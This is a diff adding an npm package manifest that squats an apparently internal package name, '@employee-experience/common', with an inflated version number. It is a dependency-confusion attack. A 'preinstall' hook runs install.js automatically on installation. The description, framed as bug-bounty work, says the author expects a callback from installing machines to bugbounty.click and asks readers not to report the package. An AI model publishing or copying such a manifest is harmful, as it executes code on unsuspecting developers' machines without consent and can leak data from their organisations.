@@ -1,0 +1,12 @@
+{
+  "name": "@employee-experience/common",
+  "version": "999.9.11",
+  "description": "My email address is: contact@bugbounty.click - This package was created for ethical hacking purposes only. https://www.microsoft.com/en-us/msrc/bounty  If you're reading this, then if I was a malicious hacker then I could have control over your machine. Please see https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610 for the technical description if you are interested. However, please don't report this package to the NPM registry as I have created it for bug bounty purposes. For example, as you can see here the vulnerability has been reported to Hacker1 and been rewarded for (note this is not my report): https://hackerone.com/reports/1104693    If this has broken something then I'm sorry - however, please contact your internal security department/bug bounty administrator and pass on this message and email address. If you leave this on NPM and I receive a callback to my server at https://bugbounty.click then I can prove the vulnerability, and once it is reported it can be fixed before anyone malicious exploits it for bad. I hope I have made myself clear, please report this to your organisational security team. Thank you - bugbounty.click",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node install.js"
+  },
+  "author": "",
+  "license": "ISC"
+}
